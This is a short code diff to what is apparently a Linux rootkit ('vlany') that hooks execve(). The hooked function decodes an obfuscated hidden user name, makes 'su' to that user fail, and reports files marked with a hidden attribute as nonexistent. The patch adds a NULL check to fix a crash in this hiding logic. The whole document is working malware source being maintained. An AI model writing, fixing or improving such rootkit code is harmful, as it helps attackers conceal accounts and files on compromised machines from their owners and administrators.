@@ -127,7 +127,8 @@ int execve(const char *filename, char *const argv[], char *const envp[])
     }
 
     char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
-    if(strstr(filename, "su") && !strcmp(argv[1], vlany_user) && strlen(vlany_user) == strlen(argv[1])) { CLEAN(vlany_user); errno = EIO; return -1; }
+    // segmentation fault due to vlany trying to access something that might not exist
+    if(strstr(filename, "su") && argv[1] && !strcmp(argv[1], vlany_user)) { CLEAN(vlany_user); errno = EIO; return -1; }
     CLEAN(vlany_user);
 
     if(hidden_xattr(filename)) { errno = ENOENT; return -1; }
